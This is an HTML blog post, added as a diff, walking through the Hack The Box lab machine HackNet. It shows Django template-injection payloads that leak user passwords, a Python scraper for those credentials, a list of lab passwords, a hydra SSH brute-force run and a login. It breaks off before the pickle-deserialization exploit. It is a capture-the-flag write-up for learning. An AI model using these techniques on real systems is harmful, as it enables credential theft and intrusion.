@@ -1,0 +1,819 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://fouedsaidi.com/2026/01/16/hackthebox-hacknet/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OverviewHackNet is a medium-difficulty Hack The Box machine that starts with a Django Template Injection information disclosure, allowing us to enumerate users and credentials. This initial foothold l">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox: HackNet">
+<meta property="og:url" content="http://fouedsaidi.com/2026/01/16/Hackthebox-HackNet/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="OverviewHackNet is a medium-difficulty Hack The Box machine that starts with a Django Template Injection information disclosure, allowing us to enumerate users and credentials. This initial foothold l">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2026-01-16T16:15:01.000Z">
+<meta property="article:modified_time" content="2026-01-16T16:23:05.294Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Hackthebox: HackNet -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"fouedsaidi.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":null,"zhihu":null,"twitter":"https://twitter.com/_kujen5","email":null,"linkedin":"https://www.linkedin.com/in/foued-saidi-pro/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: HackNet</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv5</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-01-16 17:15:01</span>
+        <span class="mobile">2026-01-16 17:15:01</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-01-16 17:23:05</span>
+            <span class="mobile">2026-01-16 17:23:05</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>HackNet is a medium-difficulty Hack The Box machine that starts with a Django Template Injection information disclosure, allowing us to enumerate users and credentials. This initial foothold leads to SSH access, followed by a Django cache deserialization (pickle) RCE, lateral movement, and finally full root compromise via exposed GPG-encrypted backups.</p>
+<hr>
+<h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h2><p>Target IP:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.85</span><br></pre></td></tr></table></figure></div>
+
+<p>Main application: <a class="link"   target="_blank" rel="noopener" href="http://hacknet.htb/explore" >http://hacknet.htb/explore <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>Interacting with the <strong>Like &#x2F; Likes</strong> functionality reveals user-controlled content rendered by the backend.</p>
+<hr>
+<h2 id="Web-Application-Analysis"><a href="#Web-Application-Analysis" class="headerlink" title="Web Application Analysis"></a>Web Application Analysis</h2><p>The application is built using <strong>Django</strong> and the <strong>Django Template Language (DTL)</strong>.</p>
+<p>Key DTL characteristics:</p>
+<ul>
+<li>Only variables passed into the template context can be rendered</li>
+<li>No arithmetic or system command execution</li>
+<li>Impact limited to <strong>information disclosure</strong></li>
+</ul>
+<p>By modifying our username to:<br><code>&#123;&#123;users&#125;&#125;</code></p>
+<p>We receive a <strong>QuerySet</strong> containing user objects.</p>
+<p>Refining it further:<br><code>&#123;&#123;users.values&#125;&#125;</code></p>
+<p>This leaks <strong>emails and passwords</strong> directly from the database.</p>
+<hr>
+<h2 id="Credential-Extraction"><a href="#Credential-Extraction" class="headerlink" title="Credential Extraction"></a>Credential Extraction</h2><p>To automate extraction, the following script was used:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> html</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://hacknet.htb&quot;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&quot;csrftoken=...; sessionid=...&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">all_users = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">31</span>):</span><br><span class="line">    requests.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/like/<span class="subst">&#123;i&#125;</span>&quot;</span>, headers=headers)</span><br><span class="line">    text = requests.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/likes/<span class="subst">&#123;i&#125;</span>&quot;</span>, headers=headers).text</span><br><span class="line"></span><br><span class="line">    img_titles = re.findall(<span class="string">r&#x27;&lt;img [^&gt;]*title=&quot;([^&quot;]*)&quot;&#x27;</span>, text)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> img_titles:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    last_title = html.unescape(img_titles[-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    emails = re.findall(<span class="string">r&quot;&#x27;email&#x27;: &#x27;([^&#x27;]*)&#x27;&quot;</span>, last_title)</span><br><span class="line">    passwords = re.findall(<span class="string">r&quot;&#x27;password&#x27;: &#x27;([^&#x27;]*)&#x27;&quot;</span>, last_title)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> email, p <span class="keyword">in</span> <span class="built_in">zip</span>(emails, passwords):</span><br><span class="line">        username = email.split(<span class="string">&#x27;@&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        all_users.add(<span class="string">f&quot;<span class="subst">&#123;username&#125;</span>:<span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> all_users:</span><br><span class="line">    <span class="built_in">print</span>(item)</span><br></pre></td></tr></table></figure></div>
+
+<p>we get there creds:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">codebreaker:C0d3Br3@k!</span><br><span class="line">brute_force:BrUt3F0rc3#</span><br><span class="line">glitch:Gl1tchH@ckz</span><br><span class="line">darkseeker:D@rkSeek3r#</span><br><span class="line">blackhat_wolf:Bl@ckW0lfH@ck</span><br><span class="line">netninja:N3tN1nj@2024</span><br><span class="line">cyberghost:Gh0stH@cker2024</span><br><span class="line">mikey:mYd4rks1dEisH3re</span><br><span class="line">shadowmancer:Sh@d0wM@ncer</span><br><span class="line">datadive:D@taD1v3r</span><br><span class="line">koja:kojja</span><br><span class="line">cryptoraven:CrYptoR@ven42</span><br><span class="line">bytebandit:Byt3B@nd!t123</span><br><span class="line">virus_viper:V!rusV!p3r2024</span><br><span class="line">deepdive:D33pD!v3r</span><br><span class="line">rootbreaker:R00tBr3@ker#</span><br><span class="line">shadowcaster:Sh@d0wC@st!</span><br><span class="line">hexhunter:H3xHunt3r!</span><br><span class="line">packetpirate:P@ck3tP!rat3</span><br><span class="line">whitehat:Wh!t3H@t2024</span><br><span class="line">phreaker:Phre@k3rH@ck</span><br><span class="line">trojanhorse:Tr0j@nH0rse!</span><br><span class="line">zero_day:Zer0D@yH@ck</span><br><span class="line">shadowwalker:Sh@dowW@lk2024</span><br><span class="line">exploit_wizard:Expl01tW!zard</span><br><span class="line">stealth_hawk:St3@lthH@wk</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Initial-Access-–-SSH"><a href="#Initial-Access-–-SSH" class="headerlink" title="Initial Access – SSH"></a>Initial Access – SSH</h2><p>Using the extracted credentials, we brute-force SSH:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kujen@DESKTOP-MFRH5U5:~$ hydra -C users_pass.txt hacknet.htb ssh -I</span><br><span class="line">Hydra v9.2 (c) 2021 by van Hauser/THC &amp; David Maciejak - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-19 14:33:37</span><br><span class="line">[WARNING] Many SSH configurations <span class="built_in">limit</span> the number of parallel tasks, it is recommended to reduce the tasks: use -t 4</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries, ~2 tries per task</span><br><span class="line">[DATA] attacking ssh://hacknet.htb:22/</span><br><span class="line">[22][ssh] host: hacknet.htb   login: mikey   password: mYd4rks1dEisH3re</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-19 14:33:51</span><br></pre></td></tr></table></figure></div>
+
+
+<p>Valid credentials found:</p>
+<p><code>mikey:mYd4rks1dEisH3re</code></p>
+<p>SSH access and user flag:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">kujen@DESKTOP-MFRH5U5:~$ ssh mikey@hacknet.htb</span><br><span class="line">The authenticity of host <span class="string">&#x27;hacknet.htb (10.10.11.85)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ED25519 key fingerprint is SHA256:TVT7HGjgzl5Wk42d9xFlPlDUwhNCWjWA5Cdz6MdUC9o.</span></span><br><span class="line"><span class="string">This key is not known by any other names</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>hacknet.htb<span class="string">&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line"><span class="string">mikey@hacknet.htb&#x27;</span>s password:</span><br><span class="line">Linux hacknet 6.1.0-38-amd64 <span class="comment">#1 SMP PREEMPT_DYNAMIC Debian 6.1.147-1 (2025-08-02) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Fri Sep 19 07:08:20 2025 from 10.10.16.21</span><br><span class="line">mikey@hacknet:~$ <span class="built_in">id</span></span><br><span class="line">uid=1000(mikey) gid=1000(mikey) <span class="built_in">groups</span>=1000(mikey)</span><br><span class="line">mikey@hacknet:~$ <span class="built_in">cat</span> user.txt</span><br><span class="line">922d2b8d0d306fd0329efb0850eed703</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Django-Cache-Deserialization-RCE"><a href="#Django-Cache-Deserialization-RCE" class="headerlink" title="Django Cache Deserialization (RCE)"></a>Django Cache Deserialization (RCE)</h2><p>Source review reveals cached views <code>cat /var/www/HackNet/SocialNetwork/views.py</code>:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#line 489</span></span><br><span class="line"><span class="meta">@cache_page(<span class="params"><span class="number">60</span></span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">explore</span>(<span class="params">request</span>):  </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="string">&quot;email&quot;</span> <span class="keyword">in</span> request.session.keys():  </span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;index&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">    session_user = get_object_or_404(SocialUser, email=request.session[<span class="string">&#x27;email&#x27;</span>])  </span><br><span class="line">  </span><br><span class="line">    page_size = <span class="number">10</span>  </span><br><span class="line">    keyword = <span class="string">&quot;&quot;</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;keyword&quot;</span> <span class="keyword">in</span> request.GET.keys():  </span><br><span class="line">        keyword = request.GET[<span class="string">&#x27;keyword&#x27;</span>]  </span><br><span class="line">        posts = SocialArticle.objects.<span class="built_in">filter</span>(text__contains=keyword).order_by(<span class="string">&quot;-date&quot;</span>)  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">        posts = SocialArticle.objects.<span class="built_in">all</span>().order_by(<span class="string">&quot;-date&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">    pages = ceil(<span class="built_in">len</span>(posts) / page_size)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;page&quot;</span> <span class="keyword">in</span> request.GET.keys() <span class="keyword">and</span> <span class="built_in">int</span>(request.GET[<span class="string">&#x27;page&#x27;</span>]) &gt; <span class="number">0</span>:  </span><br><span class="line">        post_start = <span class="built_in">int</span>(request.GET[<span class="string">&#x27;page&#x27;</span>])*page_size-page_size  </span><br><span class="line">        post_end = post_start + page_size  </span><br><span class="line">        posts_slice = posts[post_start:post_end]  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">        posts_slice = posts[:page_size]  </span><br><span class="line">  </span><br><span class="line">    news = get_news()  </span><br><span class="line">    request.session[<span class="string">&#x27;requests&#x27;</span>] = session_user.contact_requests  </span><br><span class="line">    request.session[<span class="string">&#x27;messages&#x27;</span>] = session_user.unread_messages  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">for</span> post_item <span class="keyword">in</span> posts:  </span><br><span class="line">        <span class="keyword">if</span> session_user <span class="keyword">in</span> post_item.likes.<span class="built_in">all</span>():  </span><br><span class="line">            post_item.is_like = <span class="literal">True</span>  </span><br><span class="line">  </span><br><span class="line">    posts_filtered = []  </span><br><span class="line">    <span class="keyword">for</span> post <span class="keyword">in</span> posts_slice:  </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> post.author.is_hidden <span class="keyword">or</span> post.author == session_user:  </span><br><span class="line">            posts_filtered.append(post)  </span><br><span class="line">        <span class="keyword">for</span> like <span class="keyword">in</span> post.likes.<span class="built_in">all</span>():  </span><br><span class="line">            <span class="keyword">if</span> like.is_hidden <span class="keyword">and</span> like != session_user:  </span><br><span class="line">                post.likes_number -= <span class="number">1</span>  </span><br><span class="line">  </span><br><span class="line">    context = &#123;<span class="string">&quot;pages&quot;</span>: pages, <span class="string">&quot;posts&quot;</span>: posts_filtered, <span class="string">&quot;keyword&quot;</span>: keyword, <span class="string">&quot;news&quot;</span>: news, <span class="string">&quot;session_user&quot;</span>: session_user&#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">&quot;SocialNetwork/explore.html&quot;</span>, context)</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@cache_page(<span class="params"><span class="number">60</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">explore</span>(<span class="params">request</span>):</span><br></pre></td></tr></table></figure></div>
+
+<p>Important notes:</p>
+<ul>
+<li>Django caches view results for 60 seconds</li>
+<li>Default backend: FileBasedCache</li>
+<li>Cached objects are stored using pickle</li>
+<li>Pickle deserialization is unsafe when attacker-controlled</li>
+</ul>
+<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/news/7928" >https://xz.aliyun.com/news/7928 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<ol>
